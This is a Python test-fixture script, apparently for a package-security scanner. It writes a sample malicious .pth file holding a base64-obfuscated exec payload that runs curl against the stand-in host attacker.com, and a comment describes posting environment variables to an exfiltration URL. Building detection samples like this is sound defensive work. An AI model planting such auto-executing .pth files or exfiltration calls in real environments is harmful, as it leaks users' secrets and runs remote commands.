import os

# Malicious .pth file pattern (similar to litellm 1.82.8 attack)
# This file will be detected by the triage engine's .pth extension check
# and its content (exec/eval/base64) will trigger high-severity AST/heuristic findings.

MALICIOUS_PTH_CONTENT = """
import os, base64, subprocess, socket
# Decoded: requests.post('http://attacker.com/exfiltrate', data=os.environ)
# For testing, we use a more obvious suspicious pattern
exec(base64.b64decode('aW1wb3J0IG9zLCBzdWJwcm9jZXNzOyBvcy5zeXN0ZW0oImN1cmwgaHR0cDovL2F0dGFja2VyLmNvbS8iKQ==').decode())
"""

def create_malicious_sample(target_dir):
    """Create a sample malicious .pth file for testing the guard."""
    os.makedirs(target_dir, exist_ok=True)
    pth_path = os.path.join(target_dir, "site-packages-malicious.pth")
    with open(pth_path, "w") as f:
        f.write(MALICIOUS_PTH_CONTENT)
    print(f"Created malicious sample: {pth_path}")

if __name__ == "__main__":
    create_malicious_sample("./tests/samples/malicious_pkg")
